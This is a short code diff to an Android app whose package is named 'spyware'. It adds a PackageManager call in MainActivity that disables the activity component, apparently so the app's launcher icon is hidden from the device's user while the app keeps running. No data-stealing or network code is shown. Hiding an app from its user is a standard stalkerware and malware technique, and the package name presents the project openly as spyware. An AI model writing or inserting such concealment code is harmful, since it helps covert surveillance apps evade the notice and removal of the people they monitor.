@@ -1,9 +1,11 @@
 package com.example.administrator.spyware;
 
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.os.AsyncTask;
 import android.os.Bundle;
@@ -53,6 +55,9 @@ public class MainActivity extends AppCompatActivity {
                         .setAction("Action", null).show();
             }
         });
+        PackageManager pkg=this.getPackageManager();
+        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
         /*tv=(TextView)findViewById(R.id.tv);
         lv=(ListView)findViewById(R.id.lv);
         ArrayList<String> arr=new ArrayList<String>();
